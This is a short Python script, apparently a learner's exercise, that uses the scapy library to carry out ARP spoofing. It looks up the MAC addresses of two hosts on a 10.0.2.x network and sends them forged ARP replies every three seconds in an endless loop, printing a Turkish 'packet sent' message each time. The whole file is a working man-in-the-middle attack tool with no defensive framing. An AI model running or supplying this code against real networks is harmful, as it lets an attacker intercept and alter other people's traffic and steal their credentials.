#!/usr/bin/python
# -*- coding: utf-8 -*-

import scapy.all as scapy
import time

def get_mac_address(target_ip):
    arp = scapy.ARP(pdst=target_ip)
    ether = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
    combined = ether / arp
    answered = scapy.srp(combined,timeout=1,verbose=False)[0]
    return answered[0][1].hwsrc

def arp_poisoning(target_ip,poisoning_ip):
    target_mac = get_mac_address(target_ip)
    arp = scapy.ARP(op=2,psrc=poisoning_ip,hwdst=target_mac,pdst=target_ip)
    scapy.send(arp,verbose=False)

while(True):
    arp_poisoning("10.0.2.1","10.0.2.3")
    arp_poisoning("10.0.2.3","10.0.2.1")
    print("paket yollandı..")
    time.sleep(3)
